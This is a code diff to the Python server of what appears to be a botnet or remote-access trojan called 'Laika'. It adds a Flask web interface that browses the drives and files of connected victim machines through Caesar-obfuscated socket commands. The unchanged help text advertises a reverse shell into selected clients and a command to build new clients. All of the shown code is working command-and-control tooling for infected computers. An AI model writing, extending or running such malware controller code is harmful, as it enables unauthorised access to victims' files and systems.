@@ -1,10 +1,13 @@
 from colorama import Fore, Style
 from prettytable import PrettyTable
 from geoip import geolite2
+from flask import Flask, request, send_file, render_template, send_from_directory, jsonify
 from threading import Thread
 import os, sys, time
 import select
 import socket
+import logging
+import urllib.parse
 
 ADRESSE = "192.168.1.35"#socket.gethostname()
 PORT = 4444 
@@ -38,6 +41,92 @@ def CAESAR_DECRYPT(in_s: str) -> str :
             r+=" "
     return r
 
+app = Flask(__name__) 
+# Disable Flask's default logging
+#log = logging.getLogger('werkzeug')
+#log.disabled = True
+
+@app.route('/<path:filename>')
+def serve_file(filename):
+    file_path = os.path.join(app.root_path, 'FileExplorer', filename)
+    return send_from_directory(os.path.dirname(file_path), os.path.basename(file_path))
+
+@app.route('/')
+def index() :
+    index_path = os.path.join(os.getcwd(), 'FileExplorer/index.html')
+    return send_file(index_path)
+
+path_file_ex = ""
+@app.route('/get_data', methods=['POST'])
+def get_data() :
+    global path_file_ex
+    data = []
+    
+    got_path = request.get_data().decode("latin-1")
+    got_path = urllib.parse.unquote_plus(got_path)
+    if got_path and got_path != "{}" :
+        got_path = got_path.replace("<a>","").replace("</a>","").replace("folder_path=","")
+
+        if got_path == ".." :
+            folders = path_file_ex.split("/")
+            if folders != [".."] and folders != [""] : 
+                folders.pop()
+                folders.pop()
+                path_file_ex = '/'.join(folders)
+                if path_file_ex != "" :
+                    path_file_ex += "/"
+        else :
+            path_file_ex += got_path + "/"
+
+    i = -1
+    print(path_file_ex.split("/"))
+
+    if CONNECT_CLIENTS != [] :
+        data.append({"url" : f"<a>..</a>", "modified":"", "size" : ""})
+
+    for client in CONNECT_CLIENTS :
+        i += 1
+        if len(path_file_ex.split("/")) == 1 or path_file_ex == "" :
+            data.append({"url" : f"<a>Client n°{i}</a>", "modified":"", "size" : ""})
+            continue
+
+        if len(path_file_ex.split("/")) == 2 :
+            #getting drive letters
+            path_parts = path_file_ex.split("/")
+            client_num = int(path_parts.pop(0).replace("Client n°",""))
+            if client_num != i : continue
+            client.send(CAESAR("get_drives").encode())
+            drives = recv_message_ret(client).decode("utf-8")
+            for d in drives :
+                data.append({"url": f"<a>{d}</a>", "modified": "", "size":""})
+            continue
+
+        else :
+            client.send(CAESAR("get_file_list").encode())
+            path_parts = path_file_ex.split("/")
+            client_num = int(path_parts.pop(0).replace("Client n°",""))
+            if client_num != i : continue
+            path_parts[0] = path_parts[0] + ":"
+            path_file_ex_2 = '/'.join(path_parts)
+            client.send(CAESAR(path_file_ex_2 + "\0").encode())
+            
+            files = recv_message_ret(client).decode("latin-1")
+            for f in files.split("/") :
+                f = CAESAR_DECRYPT(f)
+                #print(path_file_ex + f)
+
+                client.send(CAESAR("get_obj_info").encode())
+
+                client.send(CAESAR(path_file_ex + f + "\0").encode())
+                
+                infos = recv_message_ret(client).decode("latin-1")
+                #print(infos)
+
+                data.append({"url": f"<a>{f}</a>", "modified": "", "size":""})
+                
+    json_data = jsonify({"data":data})
+    return json_data
+
 def ban() :
     if is_linux_user() :
         os.system("clear")
@@ -49,7 +138,7 @@ def ban() :
     print(Fore.RED + " / /   / _` || || |/ // _` |")
     print(Fore.RED + "/ /___| (_| || ||   <| (_| |")
     print(Fore.RED + "\____/ \__,_||_||_|\_\\\__,_|")
-    print(Style.BRIGHT + Fore.GREEN +"Là où fini l'État, commence l'arc-en-ciel." + Fore.RESET + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.GREEN +"Là où finit l'État, commence l'arc-en-ciel." + Fore.RESET + Style.RESET_ALL)
     print("")
 
 def on_new_client() -> None :
@@ -89,6 +178,24 @@ def update_title() -> None :
             os.system("title Laika ^| "+str(len(CONNECT_CLIENTS))+" bots - Selection : n°" + str(SELECTED_CLIENT))
         time.sleep(2)
 
+def recv_message_ret(client) :
+    message = ""
+    while True :
+        client.settimeout(0.1)
+        try :
+            message = client.recv(4096)
+            if CAESAR_DECRYPT(message.decode("latin-1")) == "done" :
+                break
+        except socket.timeout :
+            break
+        if not message:
+            break
+        
+        if client.gettimeout() == 0:
+            break
+    
+    return message
+
 def recv_message(socket_object) -> bool:
     socket_object.settimeout(0.1)
     while True:
@@ -109,15 +216,17 @@ def recv_message(socket_object) -> bool:
 def main() -> None :
     global SELECTED_CLIENT
 
-    ban()
-
     THREAD_LIST.append(Thread(target = on_new_client, args = ()))
     THREAD_LIST.append(Thread(target = on_close_socket, args = ()))
     THREAD_LIST.append(Thread(target = update_title, args = ()))
-
+    THREAD_LIST.append(Thread(target = app.run, kwargs = {"debug":False}))
+    
     for t in THREAD_LIST :
         t.daemon = True
         t.start()
+    
+    time.sleep(1)
+    ban()
 
     while True :
         cmd = input(Fore.LIGHTBLUE_EX +"-> " + Fore.RESET)
@@ -131,6 +240,7 @@ def main() -> None :
             print("deselect : désélectionne le client précédemment séléctionné avec \"select\"")
             print("shell : ouvre un reverse shell dans le client précédemment séléctionné avec \"select\"")
             print("build : build un client")
+            print("fex : ouvre l'explorateur de fichiers")
             print("")
 
         elif cmd == "exit" :
@@ -231,6 +341,10 @@ def main() -> None :
                 client.send(CAESAR(command+"\n").encode())
             
             print("\nSession terminée.")
+        
+        elif cmd == "fex" :
+            print("\nClique sur le lien ci-dessous pour voir le file explorer :")
+            print("http://127.0.0.1:5000")
 
         else :
             print("Commande non reconnue, \"help\" pour afficher la liste des commandes.")
